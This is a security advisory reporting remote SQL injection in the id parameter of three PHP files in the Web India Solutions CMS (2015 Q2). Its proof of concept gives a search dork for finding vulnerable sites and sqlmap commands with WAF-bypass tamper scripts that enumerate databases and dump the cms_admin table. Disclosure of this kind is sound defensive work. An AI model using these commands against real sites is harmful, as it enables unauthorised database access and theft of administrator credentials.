Discovery Status:
=================
Published


Affected Product(s):
====================
Web India Solutions
Product: Content Management System 2015 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
Multiple remote sql injection vulnerabilities has been discovered in the official Content Management System Web India Solutions (2015 Q2).
The vulnerability allows remote attackers to execute own sql commands to compromise the web-applicaation or database management system.

The vulnerabilities are located in the id value of the `departments.php`,`offers.php` and `photogallery_view.php` files. Remote attackers are 
able to execute own sql commands by manipulation of the GET method request with the vulnerable id value. The request method to inject the 
command is GET and the issue is located on the application-side.

The security risk of the sql injection vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.3.
Exploitation of the remote sql injection web vulnerability requires no user interaction or privileged web-application user account.
Successful exploitation of the remote sql injection results in dbms, web-server and web-application compromise.

Request Method(s):
						[+] GET

Vulnerable File(s):
						[+] departments.php
						[+] offers.php
						[+] photogallery_view.php

Vulnerable Parameter(s):
						[+] id


Proof of Concept (PoC):
=======================
The remote sql injection web vulnerability can be exploited by remote attackers without user interaction or privilege web-application user account.
For security demonstration or to reproduce follow the provided information and steps below to continue.

Dork(s):
intext:"Website Development Web India Solutions" +inurl:.php?id=  

PoC: Payload(s)
https://www.[SITE].com/anyinfectedfile.php?id=[]'[SQL INJECTION VULNERABILITY!]

SQLMAP Payload(s):
sqlmap -u http://www.site.com/anyinfectedfile.php?id=[] --dbs --tamper modsecurityzeroversioned.py
sqlmap -u http://www.site.com/anyinfectedfile.php?id=[] -D [DB_NAME] --tables --tamper modsecurityzeroversioned.py,space2morehash.py
sqlmap -u http://www.site.com/anyinfectedfile.php?id=[] --dump -D [DB_NAME] -T cms_admin --tamper modsecurityzeroversioned.py,space2morehash.py
